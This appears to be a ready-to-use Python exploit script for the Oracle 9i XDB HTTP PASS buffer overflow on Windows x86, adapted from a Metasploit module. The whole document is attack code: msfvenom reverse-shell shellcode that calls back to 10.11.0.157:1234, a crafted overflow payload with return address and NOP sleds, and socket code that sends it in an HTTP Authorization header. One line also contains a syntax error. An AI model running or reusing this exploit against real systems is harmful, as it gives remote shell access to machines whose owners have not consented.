# Python Exploit for Oracle-9i-XDB-Windows-x86 HTTP-PASS-Overflow-Metasploit-

#Easy Ready to use Custom python exploit for Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)
#Creator: 6odhi

#Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)
#https://www.exploit-db.com/exploits/16809/

#Spawns a reverse meterpreter shell on 10.11.0.157 port 1234
#TODO : 1)Replace targetIp  2) Start multi/handler for windows/shell/reverse_tcp before firing up the exploit
#Usage: python xdbHttpExpoit.py 

   #!/usr/bin/python -tt
   import socket,os,sys,base64
   #msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.157 LPORT=1234 EXITFUN=thread --platform windows -a x86 --smallest -f python -v shellCode -b '\x00'

   #return Address "\x46\x6d\x61\x60"  0x60616d46

shellCode =  ""
shellCode += "\x29\xc9\x66\xb9\x18\x01\xe8\xff\xff\xff\xff\xc1"
shellCode += "\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\xea\x81\x04\x05"
shellCode += "\x06\x67\x81\xec\x3b\xcb\x68\x86\x5e\x3f\x9b\x43"
shellCode += "\x1e\x98\x46\x01\x9d\x65\x30\x16\xad\x51\x3a\x2c"
shellCode += "\xe1\xb3\x1c\x40\x5e\x21\x08\x05\xe7\xe8\x25\x28"
shellCode += "\xed\xc9\xde\x7f\x79\xa4\x62\x21\xb9\x79\x08\xbe"
shellCode += "\x7a\x26\x40\xda\x72\x3a\xed\x6c\xb5\x66\x60\x40"
shellCode += "\x91\xc8\x0d\x5d\xa5\x7d\x01\xc2\x7e\xc0\x4d\x9b"
shellCode += "\x7f\xb0\xfc\x90\x9d\x5e\x55\x92\x6e\xb7\x2d\xaf"
shellCode += "\x59\x26\xa4\x66\x23\x7b\x15\x85\x3a\xe8\x3c\x41"
shellCode += "\x67\xb4\x0e\xe2\x66\x20\xe7\x35\x72\x6e\xa3\xfa"
shellCode += "\x76\xf8\x75\xa5\xff\x33\x5c\x5d\x21\x20\x1d\x24"
shellCode += "\x24\x2e\x7f\x61\xdd\xdc\xde\x0e\x94\x6c\x05\xd4"
shellCode += "\xe2\xb8\xbe\x8d\x8e\xe7\xe7\xe2\xa0\xcc\xc0\xfd"
shellCode += "\xda\xe0\xbe\x9e\x65\x4e\x24\x0d\x9f\x9f\xa0\x88"
shellCode += "\x66\xf7\xf4\xcd\x8f\x27\xc3\xa9\x55\x7e\xc6\xa7"
shellCode += "\xc6\xa5\xbb\xb1\x2f\xdb\xb6\xb5\xb2\x65\x31\x5f"
shellCode += "\xea\xeb\xec\xed\xfe\xef\x80\x91\xaa\x29\xcb\x1a"
shellCode += "\x26\x38\x1d\x5e\xa0\xdb\x9a\x9a\xa6\x56\x75\xa5"
shellCode += "\xb3\x2c\x01\x50\x16\xa3\xd4\x26\x94\xd3\xa9\x31"
shellCode += "\xb6\x2f\x55\x43\xb4\x1c\x31\x8f\xe6\x8d\xec\xbf"
shellCode += "\xbd\x83\xee\x34\x26\xb0\x0f\x24\x79\xc5\x9e\xb5"
shellCode += "\x9e\xf7\xe8\xf9\xfa\xad\x96\xfd\x96\xa7\xa4\x52"
shellCode += "\xe7\xfc\xd1\x96\x55\x6d\x08\x5f\x59\x5c\x64\x0f"
shellCode += "\xd7\xc7\x4f\xee\xc7\x12\xd7\x3c\xd0\x62\xf6\xda"


payload = "\x6a\x6a\x6a\x6a" + ":" + "\x6a" * 442 + "\xeb\x64" + "\x90" * 2 + "\x46\x6d\x61\x60" + "\x90" * 266 + "\xeb\x10" + "\x90" * 109 + "\x81\xc4\xff\xef\xff\xff\x44" + shellCode

encodedPayload = base64.b64encode(payload)
req  = "Authorization: Basic " + encodedPayload + "\r\n\r\n"
res  = "GET / HTTP/1.1\r\n" + "Host: " + "10.11.1.202:8080" +\r\n" + req


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('<targetIp>', 8080))
s.send(res)
s.recv(1024)
s.close()




